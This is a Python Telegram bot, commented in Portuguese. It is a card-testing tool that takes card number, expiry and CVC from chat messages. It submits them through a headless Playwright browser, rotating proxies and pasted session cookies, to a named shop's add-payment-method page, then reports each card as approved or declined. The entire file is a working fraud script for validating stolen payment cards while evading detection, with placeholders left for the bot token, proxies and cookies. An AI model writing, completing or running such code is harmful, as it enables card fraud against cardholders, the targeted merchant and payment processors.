from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from playwright.async_api import async_playwright
import random
import asyncio

BOT_TOKEN = "SEU_TOKEN_AQUI"
ADMIN_ID = 123456789   # Coloque seu ID aqui

# ==================== PROXIES ====================
proxies = [
    "177.136.242.21:8118",
    "187.103.105.20:8085",
    # adicione mais proxies aqui
]

# ==================== COOKIES ====================
cookies_list = [
    { ... },   # Cole aqui seu primeiro dicionário de cookies
    { ... },   # Cole aqui seu segundo dicionário de cookies
]

async def start(update: Update, context):
    await update.message.reply_text(
        "🤖 Bot de Teste de Cartão (Playwright)\n\n"
        "Envie no formato:\n"
        "`numero|mes/ano|cvc`"
    )

async def testar_cartao(numero: str, expiry: str, cvc: str):
    proxy = random.choice(proxies)
    cookies = random.choice(cookies_list)

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=[f"--proxy-server=http://{proxy}"]
        )
        context = await browser.new_context()
        
        # Adiciona cookies
        await context.add_cookies([
            {"name": k, "value": v, "domain": ".shop.wiseacrebrew.com", "path": "/"} 
            for k, v in cookies.items()
        ])
        
        page = await context.new_page()
        
        try:
            await page.goto("https://shop.wiseacrebrew.com/account/add-payment-method/", timeout=30000)
            await page.wait_for_timeout(3000)

            # Preencher Stripe (ajuste os seletores se necessário)
            await page.fill('input[name="number"]', numero)
            await page.fill('input[name="expiry"]', expiry)
            await page.fill('input[name="cvc"]', cvc)

            # Clicar no botão
            await page.click('button:has-text("Add"), button:has-text("ADD PAYMENT METHOD")')
            await page.wait_for_timeout(8000)

            content = await page.content()

            if any(x in content.lower() for x in ["successfully added", "approved", "payment method added"]):
                return "✅ APROVADO"
            elif any(x in content.lower() for x in ["declined", "card was declined"]):
                return "❌ DECLINED"
            else:
                return "⚠️ INCONCLUSIVO"

        except Exception as e:
            return f"❌ Erro: {str(e)[:80]}"
        finally:
            await browser.close()


async def handle_card(update: Update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("🚫 Acesso negado.")
        return

    text = update.message.text.strip()
    try:
        numero, expiry, cvc = [x.strip() for x in text.split('|')]
        msg = await update.message.reply_text(f"⏳ Testando cartão {numero[-4:]}...")

        resultado = await testar_cartao(numero, expiry, cvc)
        await msg.edit_text(resultado)

    except:
        await update.message.reply_text("Formato inválido. Use: `numero|mes/ano|cvc`")


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card))
    app.run_polling()


if __name__ == "__main__":
    main()
